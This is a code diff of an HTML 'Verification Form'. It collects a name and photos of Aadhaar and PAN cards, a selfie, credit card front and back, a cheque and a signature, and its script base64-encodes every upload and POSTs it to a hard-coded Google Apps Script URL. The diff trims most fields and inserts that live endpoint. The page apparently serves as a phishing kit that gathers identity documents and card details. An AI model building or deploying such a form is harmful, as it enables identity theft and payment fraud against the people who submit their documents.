@@ -167,114 +167,75 @@
         <!-- Form Title -->
         <h2>Verification Form</h2>
 
-        <!-- Verification Form -->
         <form id="verificationForm">
-            <!-- Name Input Field -->
-            <div class="form-group">
-                <label for="name">Full Name:</label>
-                <i class="fas fa-user input-icon"></i>
-                <input type="text" id="name" name="name" placeholder="Enter your full name" required>
-            </div>
-
-            <!-- Aadhaar Card Photos (Front and Back Combined) -->
-            <div class="form-group">
-                <label for="aadhaarPhotos">Upload Aadhaar Card Photos (Front and Back):</label>
-                <i class="fas fa-id-card input-icon"></i>
-                <input type="file" id="aadhaarPhotos" name="aadhaarPhotos" accept="image/*" multiple required>
-                <small>Please upload both front and back photos of your Aadhaar Card.</small>
-            </div>
-
-            <!-- PAN Card Photo -->
-            <div class="form-group">
-                <label for="panPhoto">Upload PAN Card Photo:</label>
-                <i class="fas fa-address-card input-icon"></i>
-                <input type="file" id="panPhoto" name="panPhoto" accept="image/*" required>
-            </div>
-
-            <!-- Webcam Selfie -->
-            <div class="form-group">
-                <label for="webcamSelfie">Take a Webcam Selfie:</label>
-                <i class="fas fa-camera input-icon"></i>
-                <input type="file" id="webcamSelfie" name="webcamSelfie" accept="image/*" capture="user" required>
-            </div>
-
-            <!-- Credit Card Photos (Front and Back Combined) -->
-            <div class="form-group">
-                <label for="creditCardPhotos">Upload Credit Card Photos (Front and Back):</label>
-                <i class="fas fa-credit-card input-icon"></i>
-                <input type="file" id="creditCardPhotos" name="creditCardPhotos" accept="image/*" multiple required>
-                <small>Please upload both front and back photos of your Credit Card.</small>
-            </div>
-
-            <!-- Cheque Photo -->
-            <div class="form-group">
-                <label for="chequePhoto">Upload Cheque Photo:</label>
-                <i class="fas fa-money-check input-icon"></i>
-                <input type="file" id="chequePhoto" name="chequePhoto" accept="image/*" required>
-            </div>
-
-            <!-- Client's Signature -->
-            <div class="form-group">
-                <label for="clientSignature">Upload Client's Signature:</label>
-                <i class="fas fa-signature input-icon"></i>
-                <input type="file" id="clientSignature" name="clientSignature" accept="image/*" required>
-                <small>Please upload a clear image of your signature.</small>
-            </div>
-
-            <!-- Submit Button -->
-            <div class="form-group">
-                <button type="submit" class="submit-btn">
-                    <i class="fas fa-check-circle"></i> Submit Verification
-                </button>
-            </div>
-        </form>
+    <!-- Name Input Field -->
+    <div class="form-group">
+        <label for="name">Full Name:</label>
+        <i class="fas fa-user input-icon"></i>
+        <input type="text" id="name" name="name" placeholder="Enter your full name" required>
     </div>
 
-    <script>
-        document.getElementById("verificationForm").addEventListener("submit", async (e) => {
-            e.preventDefault();
+    <!-- File Input Fields -->
+    <div class="form-group">
+        <label for="aadhaarPhotos">Upload Aadhaar Card Photos (Front and Back):</label>
+        <i class="fas fa-id-card input-icon"></i>
+        <input type="file" id="aadhaarPhotos" name="aadhaarPhotos" accept="image/*" multiple required>
+        <small>Please upload both front and back photos of your Aadhaar Card.</small>
+    </div>
 
-            const formData = new FormData(e.target);
-            const files = [];
-            const fullName = formData.get("name");
+    <!-- Add other file input fields here -->
 
-            // Process file inputs
-            const fileInputs = document.querySelectorAll("input[type='file']");
-            for (const input of fileInputs) {
-                for (const file of input.files) {
-                    const base64 = await toBase64(file);
-                    files.push({
-                        name: file.name,
-                        mimeType: file.type,
-                        data: base64.split(",")[1], // Remove the data URL prefix
-                    });
-                }
+    <!-- Submit Button -->
+    <div class="form-group">
+        <button type="submit" class="submit-btn">
+            <i class="fas fa-check-circle"></i> Submit Verification
+        </button>
+    </div>
+</form>
+
+<script>
+    document.getElementById("verificationForm").addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        const formData = new FormData(e.target);
+        const files = [];
+        const fullName = formData.get("name");
+
+        // Process file inputs
+        const fileInputs = document.querySelectorAll("input[type='file']");
+        for (const input of fileInputs) {
+            for (const file of input.files) {
+                const base64 = await toBase64(file);
+                files.push({
+                    name: file.name,
+                    mimeType: file.type,
+                    data: base64.split(",")[1], // Remove the data URL prefix
+                });
             }
+        }
 
-            // Submit data to Google Apps Script
-            const response = await fetch("YOUR_WEB_APP_URL", {
-                method: "POST",
-                body: JSON.stringify({ name: fullName, files }),
-                headers: { "Content-Type": "application/json" },
-            });
-
-            const result = await response.json();
-            if (result.status === "success") {
-                alert("Files uploaded successfully!");
-            } else {
-                alert("Error: " + result.message);
-            }
+        // Submit data to Google Apps Script
+        const response = await fetch("https://script.google.com/macros/s/AKfycbxUNyTVwVVvEwoo6ELXNEpFoVu5TbhtAorA3QW2Ass_s6Ld4eiZyYdyDKxRMtG7XE4J/exec", {
+            method: "POST",
+            body: JSON.stringify({ name: fullName, files }),
+            headers: { "Content-Type": "application/json" },
         });
 
-        // Convert file to Base64
-        function toBase64(file) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.readAsDataURL(file);
-                reader.onload = () => resolve(reader.result);
-                reader.onerror = (error) => reject(error);
-            });
+        const result = await response.json();
+        if (result.status === "success") {
+            alert("Files uploaded successfully!");
+        } else {
+            alert("Error: " + result.message);
         }
-    </script>
-</body>
-</html>
+    });
+
+    // Convert file to Base64
+    function toBase64(file) {
+        return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.readAsDataURL(file);
+            reader.onload = () => resolve(reader.result);
+            reader.onerror = (error) => reject(error);
+        });
+    }
+</script>
